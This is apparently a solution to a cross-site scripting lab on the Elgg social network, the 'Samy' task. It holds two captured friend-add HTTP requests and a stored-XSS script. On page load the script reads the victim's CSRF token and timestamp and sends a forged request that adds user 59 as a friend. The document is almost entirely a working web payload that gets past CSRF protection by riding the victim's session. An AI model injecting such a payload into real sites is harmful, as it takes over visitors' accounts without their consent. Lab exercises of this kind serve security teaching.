//GET /action/friends/add?friend=59&__elgg_ts=1668587982&__elgg_token=ukXorS40VGVBNc8zabF_DQ&__elgg_ts=1668587982&__elgg_token=ukXorS40VGVBNc8zabF_DQ HTTP/1.1
//GET /action/friends/add?friend=59&__elgg_ts=1668588036&__elgg_token=C5wAtLuSIhwqh7pj960xow&__elgg_ts=1668588036&__elgg_token=C5wAtLuSIhwqh7pj960xow HTTP/1.1
<script type="text/javascript">
    window.onload = function () {
        var Ajax=null;
        var ts="&__elgg_ts="+elgg.security.token.__elgg_ts; // (1)
        var token="&__elgg_token="+elgg.security.token.__elgg_token; // (2)
        //Construct the HTTP request to add Samy as a friend.
        var sendurl="/action/friends/add?friend=59"+ts+token+ts+token; //FILL IN
        //Create and send Ajax request to add friend
        Ajax=new XMLHttpRequest();
        Ajax.open("GET", sendurl, true);
        Ajax.send();
    }
</script>